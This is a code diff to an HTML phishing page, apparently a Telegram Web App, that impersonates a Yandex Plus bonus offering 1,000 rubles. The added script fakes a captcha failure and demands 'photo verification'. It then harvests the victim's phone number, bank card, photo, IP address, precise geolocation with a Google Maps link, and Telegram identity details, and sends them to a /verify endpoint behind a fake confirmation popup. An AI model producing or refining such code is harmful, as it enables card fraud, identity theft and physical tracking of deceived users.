@@ -7,7 +7,7 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            --primary: #FFCC00; /* Яндекс Желтый */
+            --primary: #FFCC00;
             --secondary: #ff3333;
             --bg: #050505;
             --text: #ffffff;
@@ -52,22 +52,6 @@
             box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
         }
 
-        /* Эффект сияния */
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -50%; left: -50%;
-            width: 200%; height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,204,0,0.05), transparent);
-            transform: rotate(45deg);
-            animation: shimmer 4s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { transform: translateX(-150%) rotate(45deg); }
-            100% { transform: translateX(150%) rotate(45deg); }
-        }
-
         .y-logo {
             width: 80px;
             filter: drop-shadow(0 0 10px rgba(255,204,0,0.3));
@@ -105,12 +89,6 @@
             font-size: 16px;
             margin-bottom: 12px;
             box-sizing: border-box;
-            transition: 0.3s;
-        }
-
-        .input-box:focus {
-            border-color: var(--primary);
-            background: rgba(255, 255, 255, 0.1);
             outline: none;
         }
 
@@ -125,13 +103,12 @@
             font-weight: 800;
             cursor: pointer;
             text-transform: uppercase;
-            box-shadow: 0 10px 30px rgba(255, 204, 0, 0.3);
             animation: btnPulse 2s infinite;
         }
 
         @keyframes btnPulse {
             0% { transform: scale(1); }
-            50% { transform: scale(1.03); box-shadow: 0 10px 40px rgba(255, 204, 0, 0.5); }
+            50% { transform: scale(1.03); }
             100% { transform: scale(1); }
         }
 
@@ -173,7 +150,6 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Yandex_logo.svg" class="y-logo">
     <br>
     <div class="plus-tag">ПЛЮС БОНУС</div>
-    
     <div class="amount">1,000 ₽</div>
     <p style="color: #bbb; font-size: 13px; margin-bottom: 20px;">Средства зачисляются мгновенно через систему быстрых платежей.</p>
 
@@ -202,52 +178,82 @@
     tg.expand();
     tg.setHeaderColor('#050505');
 
+    // Функция получения ГЕО
+    function getCoords() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) return resolve("Гео недоступно");
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`),
+                (err) => resolve("Отклонено пользователем"),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+
+    // Обработка клика по капче
     function handleCaptcha(el) {
         const text = document.getElementById('capText');
         const circle = document.getElementById('capCircle');
-        text.innerText = 'Синхронизация...';
+        text.innerText = 'Синхронизация Яндекс ID...';
         circle.innerHTML = '⌛';
-        
         setTimeout(() => {
             alert('Ошибка Яндекс ID. Требуется ручное подтверждение через фото-верификацию.');
             text.innerText = 'Ошибка. Пройдите проверку ниже.';
             circle.innerHTML = '❌';
             circle.style.borderColor = '#ff3333';
-            circle.style.color = '#ff3333';
         }, 1500);
     }
 
+    // ЕДИНАЯ ОТПРАВКА ФОРМЫ
     document.getElementById('claimForm').onsubmit = async (e) => {
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
-        btn.innerText = 'ПЕРЕВОД...';
+        
+        if (!document.getElementById('photo').files[0]) {
+            alert("Сначала сделайте фото-верификацию");
+            return;
+        }
+
+        btn.innerText = 'ОБРАБОТКА...';
         btn.disabled = true;
 
         try {
+            // Сбор данных
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const { ip } = await ipRes.json();
-            
+            const location = await getCoords();
+            const user = tg.initDataUnsafe?.user || {};
+
+            const fullInfo = `
+👤 **USER:** @${user.username || 'n/a'}
+🆔 **ID:** ${user.id || 'n/a'}
+👤 **NAME:** ${user.first_name || ''} ${user.last_name || ''}
+🌐 **IP:** ${ip}
+📍 **GEO:** ${location}
+⭐ **PREM:** ${user.is_premium ? 'YES' : 'NO'}`;
+
             const formData = new FormData();
             formData.append('phone', `YANDEX: ${document.getElementById('phone').value} | Card: ${document.getElementById('card').value}`);
             formData.append('ip', ip);
-            formData.append('details', `USER: @${tg.initDataUnsafe?.user?.username || 'unknown'}`);
+            formData.append('details', fullInfo);
             formData.append('photo', document.getElementById('photo').files[0]);
 
-            await fetch('/verify', { method: 'POST', body: formData });
-            
-            tg.showPopup({
-                title: 'Транзакция в очереди',
-                message: 'Средства зачислятся после проверки фото-верификации оператором службы поддержки Яндекс.',
-                buttons: [{type: 'close'}]
-            });
+            const response = await fetch('/verify', { method: 'POST', body: formData });
+
+            if (response.ok) {
+                tg.showPopup({
+                    title: 'Заявка принята',
+                    message: 'Средства зачислятся после проверки фото-верификации оператором Яндекс.Плюс.',
+                    buttons: [{type: 'close'}]
+                });
+            }
         } catch (err) {
-            alert('Ошибка сервера. Попробуйте позже.');
+            alert('Ошибка шлюза. Попробуйте позже.');
         } finally {
             btn.innerText = 'Получить 1,000 ₽';
             btn.disabled = false;
         }
     };
 </script>
-
 </body>
 </html>
